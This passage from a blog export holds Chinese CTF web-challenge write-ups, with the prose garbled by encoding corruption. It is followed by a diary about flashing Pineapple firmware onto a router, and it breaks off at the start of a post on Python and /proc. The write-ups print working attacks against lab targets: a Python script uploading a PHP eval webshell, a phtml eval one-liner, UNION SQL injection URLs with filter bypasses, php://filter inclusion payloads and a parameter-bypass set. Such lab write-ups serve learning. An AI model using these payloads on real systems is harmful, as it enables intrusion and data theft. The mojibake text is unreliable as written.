&quot;http://7894069c-9a98-4481-bc25-4a3e267ae86d.node4.buuoj.cn:81/flflflflag.php?file=&quot;def get(st): payload = url + st r = requests.get(payload) print(r.ok) #print(type(r.text)) try: print(&quot;[+ base64decode]\\n&quot;,base64.b64decode(r.text[196::][:-38:]).decode()) except Exception as e: print(&quot;[+ not encryption]\\n&quot;,r.text[196::][:-38:])def attack(): file = &quot;&lt;?php eval($_GET['cmd']);?&gt;&quot; filedata = {&quot;file&quot;: file} payload = url + &quot;php://filter/string.strip_tags/resource=/etc/passwd&quot; r = requests.post(url=payload,files=filedata) print (r.ok) r2 = requests.get(url=&quot;http://7894069c-9a98-4481-bc25-4a3e267ae86d.node4.buuoj.cn:81/dir.php&quot;) print (r2.text)attack()while 1 : get(input('&gt;')) ç»äº†ï¼Œç›®å½•é‡Œé¢ä¸œæ‰¾è¥¿æ‰¾ï¼Œç»“æœflagåœ¨phpinfoé‡Œflag{6dc36ed0-9300-43fa-bbae-b85d1b9cbd69} [æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQLç®€å•æµ‹è¯•ä¸€ä¸‹ï¼ŒåŒå†™ç»•è¿‡ï¼Œç®€å• æ•°æ®åº“ågeek æ•´ä¸€ä¸ªå¿«é€Ÿåˆ¤æ–­å“ªé‡Œè¢«æ›¿æ¢çš„trick http://99e1704f-301f-41a7-8754-0231317a4c13.node4.buuoj.cn:81/check.php?username=a&amp;password=admin' ununionion seselectlect 1,database(),(seselectlect &quot;union select 1,group_concat(schema_name),3 from information_schema.schemata&quot;) %23 union select 1,group_concat(schema_name),3 from information_schema.schemataå˜æˆäº† 1,group_concat(schema_name),3 infmation_schema.schemataè¿™é‡Œorä¹Ÿè¢«æ›¿æ¢äº†ï¼Œè®°å¾—åŒå†™ä¸€ä¸‹informationé‡Œé¢çš„or æ‰€ä»¥ï¼Œéœ€è¦ununionion seselectlect 1,group_concat(schema_name),3 frfromom infoorrmation_schema.schemata æ‰€æœ‰åº“information_schema,mysql,performance_schema,test,ctf,geek 1,group_concat(table_name),3 infmation_schema.tables table_schema='geek' è¡¨åb4bsql,geekuser å­—æ®µid,username,password ä¸€ç•ªæŸ¥æ‰¾æ²¡æ‰¾åˆ°æ•°æ®ï¼Œç„¶åå‘ç°æ•°æ®æ˜¯åœ¨ctfåº“é‡Œçš„ï¼Œå¯„ [ACTF2020 æ–°ç”Ÿèµ›]BackupFileæ²¡å•¥ä¸œè¥¿index.php.bakç„¶åæºç å°±ä¸€ä¸ªå¼±ç±»å‹åˆ¤æ–­ [æå®¢å¤§æŒ‘æˆ˜ 2019]Uploadæ–‡ä»¶ä¸Šä¼ ï¼Œåˆšä¼ äº†ä¿©å›¾ç‰‡ï¼Œè·Ÿæˆ‘è¯´ä¸æ˜¯imageï¼Œæœ‰è¶£ MIMEä¸€æ”¹ï¼Œæ–‡ä»¶åæ˜¯phtmlï¼Œå†…å®¹æ˜¯&lt;script language='php'&gt;@eval($_POST[cmd]);&lt;/script&gt; easy http://55facc3d-3d22-4b90-b9c7-f95c9e3f005b.node4.buuoj.cn:81/upload/1.phtml æ¢­ [ACTF2020 æ–°ç”Ÿèµ›]Upload[MRCTF2020]Ez_bypassç®€å•ï¼Œå…ˆæ˜¯md5ç„¶åæ˜¯is_numbericç»•è¿‡ï¼Œå¤ªç®€å•äº† [ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpwebfile_get_contentç›´æ¥è¯»æºç  123456789101112131415161718192021222324252627282930&lt;?php $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;); function gettime($func, $p) { $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) { return $result; } else {return &quot;&quot;;} } class Test { var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() { if ($this-&gt;func != &quot;&quot;) { echo gettime($this-&gt;func, $this-&gt;p); } } } $func = $_REQUEST[&quot;func&quot;]; $p = $_REQUEST[&quot;p&quot;]; if ($func != null) { $func = strtolower($func); if (!in_array($func,$disable_fun)) { echo gettime($func, $p); }else { die(&quot;Hacker...&quot;); } } ?&gt; å‘½åç©ºé—´ç»•è¿‡æ•°ç»„ä¹‹åï¼Œæ²¡æœ‰æƒé™å†™shellï¼Œå¤ªéš¾å—äº†,ä¸çŸ¥é“flagè¢«è—åœ¨äº†å“ªé‡Œï¼Œä¸Šbpæ‰«ä¸€ä¸‹å§ flagåœ¨/tmpä¸‹é¢flag{68a63dcd-6a3a-4a8c-bedb-7c15377fef29} [BSidesCF 2020]Had a bad dayä»¥ä¸ºæ˜¯sqlæ³¨å…¥ï¼Œæ‰“äº†ä¸ª'åå‘ç°æ˜¯æ–‡ä»¶åŒ…å« 1234Warning: include(woofers'.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 37Warning: include(): Failed opening 'woofers'.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 37 åŒ…å«index.php 12345678910111213&lt;?php $file = $_GET['category']; if(isset($file)) { if( strpos( $file, &quot;woofers&quot; ) !== false || strpos( $file, &quot;meowers&quot; ) !== false || strpos( $file, &quot;index&quot;)){ include ($file . '.php'); } else{ echo &quot;Sorry, we currently only support woofers and meowers.&quot;; } } ?&gt; PHPçš„æ–‡ä»¶åŒ…å«,å¤ªç®€å•äº† php://filter/convert.base64-encode/resource=index/../flag [BJDCTF2020]Cookie is so stableç”¨æˆ·åå†™åˆ°cookieé‡Œé¢ï¼Œemmï¼Œè²Œä¼¼æ˜¯ssti?ä½†æ˜¯è¿‡æ»¤å¾ˆä¸¥ ç•™ç€ä¹‹åå†™ [å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢ä¸Šæ¥å°±é€æºç ,666 æˆ‘å°¼ç›ï¼Œå‡ ç™¾ä¸ªæ–‡ä»¶ä¸ä¼šï¼Œè¿‡ï¼Œä¹‹ååš SSRF meå±ä¸€æ ·çš„ä¸€è¡Œä»£ç ï¼Œæˆ‘åäº†ï¼Œæ‰¾ä¸ªç¾åŒ–åçš„ä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#! /usr/bin/env python# #encoding=utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding('latin1') app = Flask(__name__) secert_key = os.urandom(16) class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): os.mkdir(self.sandbox) def Exec(self): result = {} result['code'] = 500 if (self.checkSign()): if &quot;scan&quot; in self.action: tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, 'w') resp = scan(self.param) if (resp == &quot;Connection Timeout&quot;): result['data'] = resp else: print resp tmpfile.write(resp) tmpfile.close() result['code'] = 200 if &quot;read&quot; in self.action: f = open(&quot;./%s/result.txt&quot; % self.sandbox, 'r') result['code'] = 200 result['data'] = f.read() if result['code'] == 500: result['data'] = &quot;Action Error&quot; else: result['code'] = 500 result['msg'] = &quot;Sign Error&quot; return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False @app.route(&quot;/geneSign&quot;, methods=['GET', 'POST'])def geneSign(): param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) action = &quot;scan&quot; return getSign(action, param) @app.route('/De1ta',methods=['GET','POST'])def challenge(): action = urllib.unquote(request.cookies.get(&quot;action&quot;)) param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) sign = urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip = request.remote_addr if(waf(param)): return &quot;No Hacker!!!!&quot; task = Task(action, param, sign, ip) return json.dumps(task.Exec()) @app.route('/')def index(): return open(&quot;code.txt&quot;,&quot;r&quot;).read() def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return &quot;Connection Timeout&quot; def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() def md5(content): return hashlib.md5(content).hexdigest() def waf(param): check=param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return Falseif __name__ == '__main__': app.debug = False app.run(host='0.0.0.0',port=9999) å‰©ç€ç­‰ä¼šå†™ [NCTF 2018]æ»´!æ™¨è·‘æ‰“å¡ç©ºæ ¼æ¢%0aç»“å°¾ç”¨%27å®Œäº‹ 12345information_schema,cgctf,mysql,performance_schemapcnumberid,bigtime,smalltime,flag çˆ†åˆ—åçš„æ—¶å€™ï¼Œä¸çŸ¥é“å’‹å›äº‹ï¼Œå°±æ˜¯æ²¡å›æ˜¾ï¼ŒæŠŠcgctfæ¢æˆåå…­è¿›åˆ¶å°±è¡Œäº†ä»¤äººç–‘æƒ‘ http://1.14.71.254:28163/index.php?id=114514'%a0union%a0select%a0(select%a0group_concat(flag)%a0from%a0pcnumber),(select%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema='cgctf'),(select%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name=0x70636E756D626572%a0limit%a01,1),4%a0%27 [ZJCTF 2019]NiZhuanSiWeiå»ºä¸ªå°ç«™ï¼Œhttpå‘ç°è¿ä¸ä¸Šemmmmdataä¼ªåè®®è¿›å»äº†data://text//plain;base64,d2VsY29tZSB0byB0aGUgempjdGY= æç¤ºuseless.php 1234567891011121314&lt;?php class Flag{ //flag.php public $file; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); } } } ?&gt; ç›´æ¥æ‹”å‡ºæ¥,å¾ˆæ˜æ˜¾ï¼Œååºåˆ—åŒ– easy [HCTF 2018]WarmUpCVE-2018-12613 å…³é”®åœ¨mb_strpos($_page . '?', '?')å¯¼è‡´çœŸæ­£è¯»å–çš„æ˜¯æœ€åä¸€ä¸ª?åé¢çš„æ–‡ä»¶ï¼Œä½†æ˜¯æ£€æŸ¥çš„æ—¶å€™åªæ£€æŸ¥è®¿é—®å‰é¢çš„æ–‡ä»¶ï¼Œå¯¼è‡´å¯ä»¥?file=hint.php?../../../../../../ffffllllaaaaggggç»•è¿‡ [æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQLæŠ¥é”™æ³¨å…¥updatexmlï¼Œç¦ç”¨ç©ºæ ¼ç›´æ¥ç”¨()ï¼Œç›´æ¥æ³¨è¿›å»äº† [RoarCTF 2019]Easy Calcè¿™é¢˜wafä¸ä¼šè¿‡ï¼Œéº»äº†,åŠ ä¸ªç©ºæ ¼å°±å¯ä»¥äº†ï¼Œæ’…äº† åé¢ç»•è¿‡å•åŒå¼•å·å°±ç›´æ¥ç”¨chrå‡½æ•°æ‹¼æ¥äº† [BJDCTF2020]EzPHPè®¿é—®æºä»£ç çœ‹åˆ°äº†base64 1nD3x.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354 &lt;?phphighlight_file(__FILE__);error_reporting(0); $file = &quot;1nD3x.php&quot;;$shana = $_GET['shana'];$passwd = $_GET['passwd'];$arg = '';$code = '';echo &quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;;if($_SERVER) { if ( preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\&quot;|\\'|log/i', $_SERVER['QUERY_STRING']) ) die('You seem to want to do something bad?'); }if (!preg_match('/http|https/i', $_GET['file'])) { if (preg_match('/^aqua_is_cute$/', $_GET['debu']) &amp;&amp; $_GET['debu'] !== 'aqua_is_cute') { $file = $_GET[&quot;file&quot;]; echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;; } } else die('fxck you! What do you want to do ?!');if($_REQUEST) { foreach($_REQUEST as $value) { if(preg_match('/[a-zA-Z]/i', $value)) die('fxck you! I hate English!'); } } if (file_get_contents($file) !== 'debu_debu_aqua') die(&quot;Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;&quot;);if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd ){ extract($_GET[&quot;flag&quot;]); echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;} else{ die(&quot;fxck you! you don't know my password! And you don't know sha1! why you come here!&quot;);}if(preg_match('/^[a-z0-9]*$/isD', $code) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i', $arg) ) { die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w=&quot;); } else { include &quot;flag.php&quot;; $code('', $arg); } ?&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!Aqua is the cutest five-year-old child in the world! Isn't it ? ä¸­æ‰€å‘¨çŸ¥ï¼Œeasyä»ä¸easyï¼Œä½†æ˜¯ç»†çœ‹ï¼Œè¿˜æ˜¯easy ç¬¬ä¸€æ­¥$_SERVERï¼Œè¿™ä¸ªä¸ä¼šè‡ªåŠ¨URLè§£ç ï¼Œä¼ å‚å¯ä»¥ç›´æ¥è¿›è¡ŒURLç¼–ç ï¼Œç»•è¿‡ç¬¬ä¸€å±‚æ­£åˆ™ç„¶åæ˜¯æ­£åˆ™ï¼Œè¿™ä¸ª%0aæ¢è¡Œç»•è¿‡å°±è¡Œäº†ç„¶åä¾¿æ˜¯hate Englishäº†ï¼Œåœ¨è¿™é‡Œæœ‰ä¸ªç‰¹æ€§ï¼Œ$_GET[â€˜aâ€™]=1 $_POST[â€˜aâ€™]=a é‚£ä¹ˆ$_SERVER[â€˜aâ€™]è¿”å›çš„æ˜¯aï¼Œå½“getå’Œpostä¼ çš„å˜é‡åä¹‰ä¸€æ ·çš„æ—¶å€™ï¼Œpostä¼šæŠŠgetç»™è¦†ç›–æ‰ï¼Œå°±å¯ä»¥ç»•è¿‡äº†ã€‚ ç¡®å®easyï¼Œå‡ ä¸ªé€åˆ†é¢˜æ‹¼åœ¨ä¸€èµ·çš„æ•´ç†ä¸€ä¸‹ 123456789GET:deb%75=aq%75a_is_c%75te%0a&amp;file=data://text/plain,deb%75_deb%75_aq%75a //ä¼ªåè®®&amp;sh%61na[]=1&amp;p%61sswd[]=2POST:debu=1file=1 æœ€åä¸€æ­¥,flagå†™shell [SWPUCTF 2018]SimplePHPè¿›æ¥æŸ¥çœ‹æ–‡ä»¶?file=éšä¾¿ä¸€è¯•è¯•ï¼Œå—¯å“¼ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209//file.php&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); include 'function.php'; include 'class.php'; ini_set('open_basedir','/var/www/html/'); $file = $_GET[&quot;file&quot;] ? $_GET['file'] : &quot;&quot;; if(empty($file)) { echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; } $show = new Show(); if(file_exists($file)) { $show-&gt;source = $file; $show-&gt;_show(); } else if (!empty($file)){ die('file doesn\\'t exists.'); } ?&gt;//function.php&lt;?php //show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text/html;charset=utf-8&quot;); error_reporting(0); function upload_file_do() { global $_FILES; $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; //mkdir(&quot;upload&quot;,0777); if(file_exists(&quot;upload/&quot; . $filename)) { unlink($filename); } move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); echo '&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;ä¸Šä¼ æˆåŠŸ!&quot;);&lt;/script&gt;'; } function upload_file() { global $_FILES; if(upload_file_check()) { upload_file_do(); } } function upload_file_check() { global $_FILES; $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;); $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]); $extension = end($temp); if(empty($extension)) { //echo &quot;&lt;h4&gt;è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:&quot; . &quot;&lt;h4/&gt;&quot;; } else{ if(in_array($extension,$allowed_types)) { return true; } else { echo '&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;'; return false; } } } //class.php&lt;?phpclass C1e4r{ public $test; public $str; public function __construct($name) { $this-&gt;str = $name; } public function __destruct() { $this-&gt;test = $this-&gt;str; echo $this-&gt;test; }}class Show{ public $source; public $str; public function __construct($file) { $this-&gt;source = $file; //$this-&gt;source = phar://phar.jpg echo $this-&gt;source; } public function __toString() { $content = $this-&gt;str['str']-&gt;source; return $content; } public function __set($key,$value) { $this-&gt;$key = $value; } public function _show() { if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this-&gt;source)) { die('hacker!'); } else { highlight_file($this-&gt;source); } } public function __wakeup() { if(preg_match(&quot;/http|https|file:|gopher|dict|\\.\\./i&quot;, $this-&gt;source)) { echo &quot;hacker~&quot;; $this-&gt;source = &quot;index.php&quot;; } }}class Test{ public $file; public $params; public function __construct() { $this-&gt;params = array(); } public function __get($key) { return $this-&gt;get($key); } public function get($key) { if(isset($this-&gt;params[$key])) { $value = $this-&gt;params[$key]; } else { $value = &quot;index.php&quot;; } return $this-&gt;file_get($value); } public function file_get($value) { $text = base64_encode(file_get_contents($value)); return $text; }}?&gt;//base.php&lt;?php session_start(); ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;web3&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;&gt; &lt;script src=&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;nav class=&quot;navbar navbar-default&quot; role=&quot;navigation&quot;&gt; &lt;div class=&quot;container-fluid&quot;&gt; &lt;div class=&quot;navbar-header&quot;&gt; &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;é¦–é¡µ&lt;/a&gt; &lt;/div&gt; &lt;ul class=&quot;nav navbar-nav navbra-toggle&quot;&gt; &lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;file.php?file=&quot;&gt;æŸ¥çœ‹æ–‡ä»¶&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;upload_file.php&quot;&gt;ä¸Šä¼ æ–‡ä»¶&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;ul class=&quot;nav navbar-nav navbar-right&quot;&gt; &lt;li&gt;&lt;a href=&quot;index.php&quot;&gt;&lt;span class=&quot;glyphicon glyphicon-user&quot;&gt;&lt;/span&gt;&lt;?php echo $_SERVER['REMOTE_ADDR'];?&gt;&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/nav&gt; &lt;/body&gt; &lt;/html&gt; &lt;!--flag is in f1ag.php--&gt;//index.php&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); include 'base.php';?&gt; //upload_file.php&lt;?php include 'function.php'; upload_file(); ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta charest=&quot;utf-8&quot;&gt; &lt;title&gt;æ–‡ä»¶ä¸Šä¼ &lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div align = &quot;center&quot;&gt; &lt;h1&gt;å‰ç«¯å†™å¾—å¾ˆlow,è¯·å„ä½å¸ˆå‚…è§è°…!&lt;/h1&gt; &lt;/div&gt; &lt;style&gt; p{ margin:0 auto} &lt;/style&gt; &lt;div&gt; &lt;form action=&quot;upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;label for=&quot;file&quot;&gt;æ–‡ä»¶å:&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;æäº¤&quot;&gt; &lt;/div&gt; &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; æ³¨é‡Šé‡Œé¢éƒ½æŠŠpharå†™ä¸Šå»äº†â€¦.pharååºåˆ—åŒ–æ²¡å¾—è·‘äº†emmm","link":"/2022/10/10/%E5%81%9A%E9%A2%98%E5%AF%84%E5%BD%95/"},{"title":"æŠ˜è…¾è·¯ç”±å™¨æ—¥è®°","text":"èµ·å› â€¦.é—²æ¥æ— äº‹ï¼Œåˆ·åˆ·è§†é¢‘ï¼Œå°±ç‚¹åˆ°äº†hak5çš„ç½‘ç«™é‡Œé¢ï¼Œç„¶åå°±çœ‹åˆ°äº†ä¸€ä¸ªå¤§è è å¾ˆæƒ³è¦ï¼Œä½†æ˜¯å¤ªè´µäº†ï¼Œä½†æˆ‘åˆæƒ³ç©ï¼Œä¸€é€šæœç´¢ä¸‹ï¼Œæ‰¾åˆ°ä¸ªå¥½ç©çš„ä»“åº“ å…¶å®è¿™ä¸ªå¤§è èçš„å›ºä»¶ç”¨çš„æ˜¯é­”æ”¹çš„openwrtï¼Œåœ¨ç¿»åˆ—è¡¨çš„æ—¶å€™ï¼Œåˆšå¥½çœ‹åˆ°äº† è¯¶å˜¿ï¼Œåˆšå¥½å®¶é‡Œæœ‰ä¸ªæ”¾äº†å¥½å‡ å¹´çš„å°ç±³WIFI mini å…¶å®æœ¬æ¥æ˜¯æƒ³ç»™æˆ‘çš„ç½‘ä»¶R8500åˆ·ä¸€ä¸ªçš„ï¼Œå…³é”®è¿™ç©æ„è¿openwrtéƒ½æ²¡æœ‰é€‚é…ï¼Œæ˜¾ç„¶emmmmmm èµ„æ–™:å®˜æ–¹å›ºä»¶ä¸‹è½½åœ°å€Breed è¿™é‡Œæˆ‘çš„å°ç±³wifi miniç”¨çš„æ˜¯breed-mt7620-xiaomi-mini.binPineappleå›ºä»¶ ä¸€è·¯æŠ˜è…¾:é¦–å…ˆæ˜¯è¦å¼€sshï¼Œç„¶åè¿™æœºå™¨å¥½å‡ å¹´äº†ï¼Œæˆ‘æœçš„æ—¶å€™æœåˆ°äº†å¥½å‡ ç§ç‰ˆæœ¬çš„è¯´æ³•ï¼Œæˆ‘å…ˆæ˜¯é™çº§åˆ°0.8å¼€å‘æ¿ï¼Œå‘ç°å°ç±³wifiç»‘ä¸ä¸Šäº†ï¼Œç„¶åæ˜¯ä¸€æ­¥ä¸€æ­¥å‡çº§ï¼Œå‡çº§ä¹‹ååˆç»™æˆ‘å‡æˆäº†ç¨³å®šç‰ˆï¼Œç„¶ååˆæ˜¯é™çº§ï¼Œæœ€åæ‰æ‰¾åˆ°å®˜ç½‘çš„æ•™ç¨‹ä¸å¾—ä¸è¯´ï¼Œæœç´¢å¼•æ“æˆ‘è¿˜æ²¡ç”¨æ˜ç™½ å…¶å®ä¸éœ€è¦é™çº§ï¼Œç›´æ¥è¿›å»,åœ¨ç³»ç»Ÿæ›´æ–°é‚£å—é€‰æ‹©æ‰‹åŠ¨å‡çº§æŠŠè¿™é‡Œä¸‹è½½åˆ°çš„å¼€å‘ç‰ˆå›ºä»¶åˆ·ä¸Šå»å°±è¡Œäº†ã€‚ç„¶åæ‰“å¼€å°ç±³wifiçš„appï¼Œç™»å½•è‡ªå·±çš„å°ç±³è´¦å·ï¼Œè¿›å»åå’Œè·¯ç”±å™¨è¿›è¡Œç»‘å®šã€‚è®¾ç½®å®Œæˆåå‰å¾€ç”³è¯·ä¸€ä¸ªsshå›ºä»¶å°±è¡Œäº† ç„¶åæŒ‰ç…§ç½‘ç«™ç»™çš„æ•™ç¨‹ä¸€æ­¥ä¸€æ­¥åšå°±è¡Œäº†ã€‚ ç„¶åæˆ‘å›å®¶çš„æ—¶å€™æ²¡æŠŠUç›˜å¸¦å›å»ï¼Œæˆ‘è„‘å­ä¸€çƒ­ï¼Œç”¨æˆ‘çš„é˜µåˆ—æŸœäº†ï¼ŒæŠŠåˆ†åŒºä¸€å±è”½ï¼Œç„¶åå¼€ä¸ªå°çš„FAT32åˆ†åŒºï¼Œç»™ä»–åˆ·ä¸€ä¸‹ sshå¼€äº†ï¼Œç„¶åemmmmm æˆ‘é˜µåˆ—æŸœè¢«æ ¼å¼åŒ–äº† è‚¥è‚ ä¸é”™ï¼Œå¤§åŠå¤œçš„ç»™è‡ªå·±æ‰¾æ´»å¹²äº†ï¼ŒæŠ˜è…¾ä¸€åœˆï¼Œæ‰«äº†åˆæ‰«ï¼Œå‘ç°æˆ‘æ˜¯æ­£ç‰ˆDeskGeniusçš„å—å®³è€…ï¼Œç›—ç‰ˆçš„æ‰“å¼€æ¥å°±å…¨å¥½äº† sshæœ‰äº†ï¼Œç„¶åæ˜¯åˆ·Breedï¼Œç”¨ncå’ŒtaræŠŠå›ºä»¶å•¥çš„å…¨å¤‡ä»½ä¸€éå°±å¼€åˆ·äº† Breedåˆ·è¿›å»ä¹‹åå°±å¯ä»¥æ— è„‘ç©äº†ï¼Œæ­¤æ—¶è·¯ç”±å™¨å·²ç»åˆ·ä¸åäº†ã€‚ç›´æ¥æŠŠPineappleå›ºä»¶åˆ·è¿›å» åˆ·è¿›å»ä¹‹åç”¨ç½‘çº¿é“¾æ¥ï¼Œè‡ªå¸¦çš„DHCPæœåŠ¡ä¼šåˆ†é…ä¸€ä¸ª172çš„å†…ç½‘ï¼Œè®¿é—®http://172.16.42.1:1471/å°±å¯ä»¥å¼€å§‹ç©äº†","link":"/2022/12/18/%E6%8A%98%E8%85%BE%E8%B7%AF%E7%94%B1%E5%99%A8%E6%97%A5%E8%AE%B0/"},{"title":"æµ…è°ˆpythonä¸proc","text":"0x00 å¦‚æœpython openäº†ä¸€ä¸ªæ–‡ä»¶ï¼Œå‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿä»è¿›ç¨‹çš„I/Oæ¥çœ‹ï¼Œè¿™ä¸ªæ–‡ä»¶ä¼šå…ˆè¢«ç¼“å­˜(buffered)ï¼Œè¿™æ„å‘³ç€åœ¨å†™å…¥è¿™ä¸ªæ–‡ä»¶ä¹‹å‰ï¼Œå®ƒä¼šè¢«ä¿å­˜åœ¨ä¸€ä¸ªä¸´æ—¶çš„ä½ç½®ï¼Œè€Œä½ å¯¹å®ƒçš„ä¸€åˆ‡æ›´æ”¹éƒ½æ˜¯åœ¨æ›´æ”¹è¿™ä¸ªç¼“å­˜æ–‡ä»¶ï¼Œpythonå¹¶ä¸ä¼šæ¸…ç©ºè¿™ä¸ªç¼“å­˜åŒºé™¤éç¨‹åºç¡®å®šä½ å®Œæˆäº†å¯¹è¿™ä¸ªæ–‡ä»¶çš„ä¿®æ”¹ï¼Œæ¯”å¦‚ä½ æŠŠè¿™ä¸ªæ–‡ä»¶close()äº† å¦‚æœä½ å†™å…¥äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œä½†å¹¶æ²¡æœ‰closeï¼Œæ•°æ®å¹¶ä¸ä¼šè¢«ä¿®æ”¹ï¼Œæ¯”å¦‚: 123456with open('file.txt','r') as file: #å¯¹æ–‡ä»¶çš„ä»»ä½•æ“ä½œ file.close() #å¦‚æœæ²¡æœ‰è¿™ä¸ªæ­¥éª¤ï¼Œé‚£ä¹ˆå¯¹æ–‡ä»¶çš„ä¿®æ”¹å¹¶ä¸ä¼šè¢«ä¿å­˜ä¸‹æ¥ 0x01 /procç›®å½•Linux å†…æ ¸æä¾›äº†ä¸€ç§é€šè¿‡ /proc æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨è¿è¡Œæ—¶è®¿é—®å†…æ ¸å†…éƒ¨æ•°æ®ç»“æ„ã€æ”¹å˜å†…æ 